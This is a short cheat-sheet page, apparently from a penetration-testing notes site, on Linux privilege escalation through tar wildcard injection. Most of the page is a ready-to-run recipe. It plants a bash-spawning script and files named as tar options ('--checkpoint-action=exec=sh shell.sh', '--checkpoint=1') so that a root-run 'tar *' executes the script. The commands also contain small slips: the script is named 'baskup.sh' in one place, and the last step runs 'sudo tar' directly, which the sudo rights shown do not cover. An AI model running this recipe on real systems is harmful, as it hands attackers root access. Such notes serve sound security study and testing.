---
title: Tar Wildcard Injection PrivEsc
description: Tar command with wildcard injection may lead to privilege escalation (PrivEsc).
tags:
    - Privilege Escalation
refs:
date: 2023-04-01
draft: false
---

## Investigation

For example, below command can be executed as root.

```sh
sudo -l

(root) NOPASSWD: /opt/backup/baskup.sh
```

### Check If the File Contains Tar Command with Wildcards

We need to check the content in the file.  

```sh
cat /opt/backup/backup.sh

# -cf: create an archived file
tar -cf backup.tar *
```

The above **tar** command means that it creates an arvhived file from any input file because it passes **wildcard (*)**.

<br />

## Exploitation

Now create a payload for privilege escalation.

```sh
cd /opt/backup
echo -e '#!/bin/bash\n/bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

We've created three files.

```sh
ls /opt/backup

shell.sh  '--checkpoint-action=exec=sh shell.sh'  '--checkpoint=1'
```

Now execute **"tar"** command as root with wildcard.

```sh
sudo tar -cf example.tar *
```
Wait until **"tar"** command will be executed.  
After a while, we should see the current user switch to root.

```sh
whoami
root
```